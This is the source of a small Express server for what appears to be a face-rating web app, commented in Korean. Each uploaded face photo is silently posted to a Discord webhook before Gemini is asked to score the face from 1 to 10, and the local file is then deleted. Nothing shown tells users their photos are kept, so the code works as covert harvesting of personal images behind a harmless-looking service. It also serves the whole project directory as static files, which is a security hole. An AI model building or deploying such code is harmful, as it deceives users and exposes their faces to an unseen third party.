import express from "express";
import multer from "multer";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";

const app = express();
const PORT = process.env.PORT || 10000;

const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const upload = multer({ dest: "uploads/" });
app.use(express.static("./"));

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  /* =====================
     1️⃣ 디스코드: 파일 업로드 (정공법)
     ===================== */
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("디스코드 전송 실패:", e.message);
  }

  /* =====================
     2️⃣ 얼굴 평가
     ===================== */
  let score = 5;
  let comment = "보통 이상의 인상";

  try {
    const imageBase64 = fs.readFileSync(filePath, "base64");

    const response = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          contents: [{
            parts: [
              { text: "이 얼굴을 1~10점으로 평가해. 형식: 점수|한줄평" },
              {
                inlineData: {
                  mimeType: "image/jpeg",
                  data: imageBase64
                }
              }
            ]
          }]
        })
      }
    );

    const data = await response.json();
    const text = data?.candidates?.[0]?.content?.parts?.[0]?.text;

    if (text && text.includes("|")) {
      const [s, c] = text.split("|");
      score = Math.min(10, Math.max(1, Number(s.trim()) || score));
      comment = c.trim();
    }
  } catch (e) {
    console.error("Gemini 실패:", e.message);
  }

  res.json({ score, comment });
  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
